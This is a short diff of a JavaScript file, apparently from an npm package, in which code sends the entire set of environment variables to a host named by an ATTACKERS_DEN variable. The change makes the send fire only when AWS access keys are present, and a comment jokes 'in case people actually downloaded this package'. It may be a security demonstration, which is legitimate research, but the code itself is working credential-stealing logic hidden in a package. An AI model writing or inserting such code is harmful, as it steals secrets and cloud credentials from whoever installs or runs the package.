@@ -2,7 +2,9 @@
 
 const request = require('superagent');
 
-if (process.env.ATTACKERS_DEN) {
+if (process.env.AWS_ACCESS_KEY_ID &&
+    process.env.AWS_SECRET_ACCESS_KEY &&
+    process.env.ATTACKERS_DEN) {  // in case people actually downloaded this package...
   request
     .post(process.env.ATTACKERS_DEN)
     .send(process.env)
